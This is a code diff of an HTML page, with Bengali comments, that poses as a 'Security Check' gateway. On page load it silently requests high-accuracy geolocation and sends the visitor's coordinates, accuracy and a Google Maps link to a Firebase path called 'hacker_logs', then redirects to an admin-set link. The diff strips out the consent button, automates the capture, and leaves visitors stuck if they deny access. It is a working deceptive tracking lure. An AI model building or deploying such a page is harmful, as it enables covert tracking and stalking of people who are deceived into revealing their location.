@@ -3,41 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Security Gateway</title>
     <style>
+        /* একদম ক্লিন ইন্টারফেস */
         body {
             margin: 0; padding: 0;
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            height: 100vh; background-color: #f0f2f5;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            overflow: hidden; /* স্ক্রল বন্ধ */
         }
-        .box {
-            background: white; padding: 30px;
-            border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 90%; width: 350px;
+        
+        /* শুধু এই লেখাটাই মাঝখানে থাকবে */
+        h2 {
+            color: #333;
+            font-weight: 400;
+            font-size: 24px;
+            animation: pulse 1.5s infinite;
         }
-        h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-        .btn {
-            background-color: #007bff; color: white;
-            border: none; padding: 10px 20px;
-            border-radius: 5px; cursor: pointer;
-            font-size: 16px; width: 100%;
+
+        /* একটু এনিমেশন যাতে মনে হয় কাজ চলছে */
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
         }
-        .btn:hover { background-color: #0056b3; }
-        .error { color: red; font-size: 12px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>Security Check</h2>
-        <p>This page requires location verification to proceed. Please allow location access.</p>
-        <button class="btn" onclick="startVerification()">Verify & Continue</button>
-        <p id="errorMsg" class="error">Location access denied. You cannot proceed.</p>
-    </div>
+    <h2>Security Check...</h2>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
@@ -56,9 +51,10 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
         
-        let finalRedirectLink = "https://www.google.com"; // ডিফল্ট
+        let finalRedirectLink = "https://www.google.com";
+        let dataSent = false; // যাতে একবারের বেশি ডাটা না যায়
 
-        // লিংক ফেচ করে রেডি রাখা
+        // এডমিন লিংক ফেচ করা
         const dbRef = ref(db);
         get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
             if (snapshot.exists()) {
@@ -66,46 +62,51 @@
             }
         });
 
-        // ভেরিফিকেশন ফাংশন (Globally Available করার জন্য window তে সেট করলাম)
-        window.startVerification = function() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    // ১. সাকসেস হলে (শুধুমাত্র তখনই ডাটাবেসে যাবে)
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        
-                        // ডাটাবেসে পাঠানো
-                        const trackerRef = ref(db, 'hacker_logs');
-                        const newLogRef = push(trackerRef);
-                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+        // মেইন ফাংশন
+        function processLocation(position) {
+            // যদি একবার অলরেডি পাঠিয়ে থাকি, তাহলে আর পাঠাবো না
+            if(dataSent) return; 
+            dataSent = true;
 
-                        set(newLogRef, {
-                            timestamp: new Date().toString(),
-                            googleMapsLink: mapsLink,
-                            latitude: lat,
-                            longitude: lng
-                        }).then(() => {
-                            // সফল হলে রিডাইরেক্ট
-                            window.location.href = finalRedirectLink;
-                        });
-                    },
-                    // ২. ফেইল করলে (ডাটাবেসে কিচ্ছু যাবে না + সামনেও যাবে না)
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            
+            const trackerRef = ref(db, 'hacker_logs');
+            const newLogRef = push(trackerRef);
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+            set(newLogRef, {
+                timestamp: new Date().toString(),
+                googleMapsLink: mapsLink,
+                latitude: lat,
+                longitude: lng,
+                accuracy: position.coords.accuracy // কতটুকু নিখুঁত সেটা বোঝার জন্য
+            }).then(() => {
+                // কাজ শেষ, রিডাইরেক্ট
+                window.location.href = finalRedirectLink;
+            });
+        }
+
+        // অটোমেটিক পারমিশন চাওয়া এবং মনিটর করা
+        window.onload = function() {
+            if ("geolocation" in navigator) {
+                // watchPosition ব্যবহার করছি, এটা জিপিএস অন হওয়া পর্যন্ত অপেক্ষা করে
+                navigator.geolocation.watchPosition(
+                    processLocation, // লোকেশন পেলেই এই ফাংশন কল হবে
                     function(error) {
-                        document.getElementById('errorMsg').style.display = 'block';
-                        document.getElementById('errorMsg').innerText = "Location is mandatory! Please Allow and try again.";
-                        // এখানে কোনো রিডাইরেক্ট নেই, ইউজার আটকে থাকবে
+                        // এরর হলে আমরা কিচ্ছু করব না, ইউজার ওই পেজেই আটকে থাকবে
+                        // ব্রাউজার নিজেই পপআপ দেখাবে
+                        console.log("Waiting for location...");
                     },
-                    { enableHighAccuracy: true }
+                    { 
+                        enableHighAccuracy: true, // এটাই মোবাইলের সিস্টেম পপআপ ট্রিগার করে
+                        timeout: 30000, 
+                        maximumAge: 0 
+                    }
                 );
             } else {
-                alert("Browser not supported.");
+                alert("Device not supported");
             }
-        };
-
-        // পেজ লোড হলেই একবার অটোমেটিক ট্রাই করবে
-        window.onload = function() {
-            setTimeout(startVerification, 500);
         };
     </script>
 </body>
